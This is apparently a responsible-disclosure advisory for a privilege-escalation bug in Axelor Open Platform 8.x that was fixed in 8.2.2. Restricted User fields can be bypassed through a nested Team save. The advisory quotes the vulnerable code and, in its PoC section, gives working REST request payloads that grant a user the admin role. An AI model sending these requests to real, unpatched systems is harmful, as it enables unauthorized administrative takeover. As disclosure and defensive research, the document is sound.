https://github.com/axelor/axelor-open-platform

## Finding: User restricted-field control bypassed via nested relational save

### Disclosure
 - 3 June 2026 - reported via email
 - 4 June 2026 - maintainer confirmed vulnerability
 - <img width="1225" height="304" alt="image" src="https://github.com/user-attachments/assets/2c7c3b3a-f343-4e24-8fee-459ac243f239" />
 - 18 June 2026 - 8.2.2 released with fix

### Summary
Axelor Open Platform 8.x added a control (USER_RESTRICTED_FIELDS = roles, group, permissions, password) that prevents a non-admin from modifying those sensitive fields on a User. The control is enforced only on the top-level User save path. When a User is edited as a nested relational record inside another entity's save (for example Team.members, a many-to-many to User), the nested-record authorization checks only CAN_WRITE on the target and never applies the restricted-field control. The recursive persistence layer then loads the nested User as a managed entity and replaces its roles and group collections, which are flushed on commit. A non-admin who can write a User indirectly (via any relation, such as a Team they can edit) can therefore assign themselves or another user the admin role and group, defeating the control intended to prevent exactly that.

### Details
All references are HEAD d2041d8, axelor-core/src/main/java/com/axelor/rpc/Resource.java unless noted.

The restricted-field control is bound to the top-level User save only:
```java
private void handleUserSave(User user, Map<String, Object> values) {            // :1290
  final User currentUser = AuthUtils.getUser();
  if (currentUser != null && !AuthUtils.isAdmin(currentUser)) {
    enforceRestrictedFields(values);                                            // throws on roles/group/password
  }
  ...
}
private void enforceRestrictedFields(Map<String, Object> values) {              // :1323
  for (String field : USER_RESTRICTED_FIELDS) {
    if (values.containsKey(field)) { throw new UnauthorizedException(...); }
  }
}
```
handleUserSave is invoked only when the top-level bean is a User (save() at :1399 "if (bean instanceof User user) handleUserSave(...)"). Saving a Team never reaches it. A grep over the tree confirms enforceRestrictedFields has exactly two callers, handleUserSave and handleUserMassUpdate, both top-level.

Nested records are authorized by checkRelationalPermissions, which checks only CAN_WRITE and recurses, with no restricted-field logic:
```java
private void checkRelationalPermissions(Map<String,Object> recordMap, Class<? extends Model> target) {  // :1457
  final Long valueId = findId(recordMap);
  ...
  } else if (recordMap.containsKey("version")) {
    getSecurityWarner().check(JpaSecurity.CAN_WRITE, target, valueId);          // only CAN_WRITE
  } else { recordMap.clear(); recordMap.put("id", valueId); return; }           // no version => treated as a reference
  checkRelationalPermissions(recordMap, Mapper.of(target));                     // recurse; still no restricted-field check
}
```

Persistence applies the nested User's collection on the managed entity (axelor-core/src/main/java/com/axelor/db/JPA.java, _edit):
```java
bean = JPA.em().find(klass, id);          // :406 nested User loaded as a MANAGED entity
...                                        // requires values.version present (:413/423 "don't update reference objects")
p.clear(bean);                            // :101 clear old roles
p.addAll(bean, items);                    // :102 add attacker-supplied roles, flushed on commit
```

So a payload that nests a User (with its version) carrying roles or group inside a Team save bypasses the restricted-field control and persists the privilege change.

### PoC
Environment: axelor/aio-erp (bundles the platform). Create a clean non-admin target user "bob" (group "users", no roles). The exploiting actor is a non-admin holding CAN_WRITE on User and CAN_WRITE or CAN_CREATE on a model relating to User (for example Team), which is a realistic delegated-admin, HR, or helpdesk role.

Direct route, correctly blocked:
```
POST /ws/rest/com.axelor.auth.db.User/42
{"data":{"id":42,"version":N,"roles":[{"id":1}]}}
result: 403 Unauthorized (enforceRestrictedFields)
```

Bypass route, escalates:
```
POST /ws/rest/com.axelor.team.db.Team/3
{"data":{"id":3,"version":M,"members":[{"id":42,"version":N,"roles":[{"id":1}],"group":{"id":1}}]}}
result: 200; User 42 gains the admin role and group.
```

Cascade persistence was verified live on axelor/aio-erp: an authenticated request "POST /ws/rest/com.axelor.team.db.Team" with body {"data":{"name":"ExploitTeam","code":"EXP","members":[{"id":2,"version":0,"roles":[{"id":1}]}]}} returned HTTP 200, the returned member showed bob with version incremented from 0 to 1, and the database row auth_user_roles then contained (auth_user=2, roles=1), that is bob gained the Admin role through the nested save.

### Impact
A non-admin user with delegated write access to User and to a relating model can grant themselves or any other user the admin role and group, achieving full privilege escalation. This defeats the USER_RESTRICTED_FIELDS control whose stated purpose is to stop non-admins from setting roles, group, and password on User records.
